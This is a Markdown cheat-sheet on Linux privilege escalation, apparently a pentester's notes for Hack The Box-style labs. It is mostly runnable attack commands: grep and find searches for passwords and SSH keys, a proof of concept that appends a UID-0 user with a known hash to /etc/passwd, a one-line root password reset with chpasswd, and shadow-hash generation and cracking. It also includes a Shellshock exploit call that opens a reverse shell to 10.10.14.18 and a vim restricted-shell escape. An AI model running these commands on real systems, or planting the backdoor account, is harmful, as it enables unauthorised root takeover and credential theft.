# Linux privilege escalation

## Enumeration is key (as always)

1. Start with low hanging fruits: just browse through file system and look for credentials and other sensible information
2. Enumerate user rights and groups 
3. Look for systems to mount and also enumerate them
4. Enumerate `sudo, SUID and GUID`
5. Enumerate programms running as root
6. Look for kernerl modules vulnerabilities
7. Finally, check if kernel version is vulnerable. Typically it iis the last thing to do because it can break the whole system.

### Disclosed passwords or other credentials

* If it is webserver, first thing is to look for database credentials

```bash
cd config

grep -Ri password .
```

* Finding passwords using bash

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

* Finding passwords using linenum

```bash
./LinEnum.sh -k password
```

* Finding ssh keys

```bash
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```


### Cron services misconfigurations

`crontab -e` to edit crontab

```bash
# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

For Example,

#   m   h dom mon dow user  command

17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly


```

* Supress messages from background process

<code>  bg_proc > /dev/null 2>&1 &   </code>



## exploiting /etc/passwd

### The structure of the passwd file is as follows

<code> oracle:x:1021:1021:Oracle Services:/data/network/oracle:/bin/bash </code>

* Each line of the passwd file represents a set of parameters belonging to a user
* Parameters are separated with :
* Each parameter position is described below (source: [cyberciti](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/))

1. **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
2. **Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file. Password hash may also be present here for backward compatibility, but it precedes the one in shadow file.
3. **User ID** (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. **Group ID** (GID): The primary group ID (stored in /etc/group file)
5. **User ID Info** (GECOS): The comment field. It allow you to add extra information about the users such as userâ€™s full name, phone number etc. This field use by finger command.
6. **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell. For example, sysadmin can use the nologin shell, which acts as a replacement shell for the user accounts. If shell set to /sbin/nologin and the user tries to log in to the Linux system directly, the /sbin/nologin shell closes the connection.

### Use of passwd for privilege escalation

* privilege escalation on Linux may make use of passwd file if something can be appended to it (perform recon)
* For example kernel exploit can be compiled to execute arbitrary command to add a line to passwd file as root to make a hidden user with admin rights...

So to **make oracle user root account**, it is sufficient to add following line

<code> oracle:x:0:0::/:/bin/bash </code>

Additionally one may generate a password hash with crypt function and add it the second position instead of x. 

```bash
#POC for password generation and injection into /etc/passwd

openssl passwd w00t
#Fdzt.eqJQ4s0g

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

su root2
w00t

id
```

<code> pentester:$1$2AL4ULeB$vPb2hnoy5xgsBueJSXTsj0:0:0::/:/bin/bash </code>
Password1

#### fast change password


`echo root:toor | chpasswd`

### Shadow file 

#### make shadow files

Generate shadow files ([stackoverflow](https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow)):

<code> openssl passwd -6 -salt xyz  yourpass </code>

Note: passing -1 will generate an MD5 password, -5 a SHA256 and -6 SHA512 (recommended)

To understand which hash you need, check what is $X$:

username:$X$salt$pass....

* $1$ is MD5
* $2a$ is Blowfish
* $2y$ is Blowfish
* $5$ is SHA-256
* $6$ is SHA-512

AND dont forget salt!

#### crack shadow file

1. copy and unshadow
2. crack with john

## Diverse Other exploits

### Shell Shock 

* spot /cgi-bin
* dirbust .sh .cgi or some more exotic script files in it 
* use 34766.php

`php 34766.php -u http://shocker.htb/cgi-bin/user.sh -c "sh -i >& /dev/tcp/10.10.14.18/443 0>&1" `

### Breaking out of restricted shell using vim

```bash
vim
:set shell=/bin/sh
:shell
```
